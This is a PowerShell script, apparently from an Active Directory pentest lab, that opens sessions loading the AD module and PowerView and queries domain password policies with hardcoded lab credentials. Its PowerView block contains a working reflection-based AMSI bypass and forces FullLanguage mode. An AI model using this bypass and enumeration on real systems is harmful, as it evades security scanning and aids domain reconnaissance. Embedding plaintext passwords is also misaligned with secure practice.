# Define credentials
$securePassword_regular = ConvertTo-SecureString "sexywolfy" -AsPlainText -Force
$credential_regular = New-Object System.Management.Automation.PSCredential("robb.stark", $securePassword_regular)

$securePassword_admin = ConvertTo-SecureString "iamthekingoftheworld" -AsPlainText -Force
$credential_admin = New-Object System.Management.Automation.PSCredential("robert.baratheon", $securePassword_admin)

# Define the commands to run in the ADModule session
$ADModuleCommands = @"
# Set window title
title ADModule - Active Directory Module Session

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -ErrorAction Stop;
Unblock-File ./ADModule/Microsoft.ActiveDirectory.Management.dll -ErrorAction Stop;
Unblock-File ./ADModule/ActiveDirectory/ActiveDirectory.psd1 -ErrorAction Stop;
Import-Module ./ADModule/Microsoft.ActiveDirectory.Management.dll -Verbose -ErrorAction Stop;
Import-Module ./ADModule/ActiveDirectory/ActiveDirectory.psd1 -Verbose -ErrorAction Stop;

# Verify AD Module installation with Get-ADDomain
try {
    Write-Output 'Verifying AD module installation with Get-ADDomain...';
    Get-ADDomain -ErrorAction Stop;
} catch {
    Write-Output 'AD Module verification failed. Get-ADDomain could not be run: $_';
}
"@

# Define the commands to run in the PowerView session
$PowerViewCommands = @"
# Set window title
title PowerView - PowerView Module Session

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -ErrorAction Stop;
\$ExecutionContext.SessionState.LanguageMode = 'FullLanguage';

# AMSI Bypass
Write-Output 'Attempting AMSI bypass...';
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue(\$null, \$true);

try {
    amsiInitFailed
} catch {
    Write-Output 'AMSI bypass check: $($_.Exception.Message)';
}

# Unblock and import PowerView module
Unblock-File ./PowerView/PowerView.ps1 -ErrorAction Stop;
Import-Module ./PowerView/PowerView.ps1 -Verbose -ErrorAction Stop;

# Verify PowerView installation with Get-NetDomain
try {
    Write-Output 'Verifying PowerView installation with Get-NetDomain...';
    Get-NetDomain -ErrorAction Stop;
} catch {
    Write-Output 'PowerView verification failed. Get-NetDomain could not be run: $_';
}
"@

# Start a new PowerShell window for ADModule commands
Start-Process powershell -ArgumentList "-NoExit", "-Command", $ADModuleCommands

# Start a new PowerShell window for PowerView commands
Start-Process powershell -ArgumentList "-NoExit", "-Command", $PowerViewCommands

# Wait for user input before continuing
Read-Host "Press Enter to run credential-based commands in new windows..."

# Run additional commands using credentials in a new PowerShell window for ADModule
$ADModuleCredCommands = @"
# Set window title
title ADModule - Credential Commands for ADModule

try {
    Get-ADDefaultDomainPasswordPolicy -Credential (\$using:credential_regular) -ErrorAction Stop;
} catch {
    Write-Output \$_.Exception.Message;
}

try {
    Get-ADDefaultDomainPasswordPolicy -Credential (\$using:credential_admin) -ErrorAction Stop;
} catch {
    Write-Output \$_.Exception.Message;
}
"@

Start-Process powershell -ArgumentList "-NoExit", "-Command", $ADModuleCredCommands

# Run additional PowerView commands with credentials in another new window
$PowerViewCredCommands = @"
# Set window title
title PowerView - Credential Commands for PowerView

try {
    (Get-DomainPolicy -Credential (\$using:credential_regular)).SystemAccess;
} catch {
    Write-Output \$_.Exception.Message;
}

try {
    (Get-DomainPolicy -Credential (\$using:credential_admin)).SystemAccess;
} catch {
    Write-Output \$_.Exception.Message;
}
"@

Start-Process powershell -ArgumentList "-NoExit", "-Command", $PowerViewCredCommands
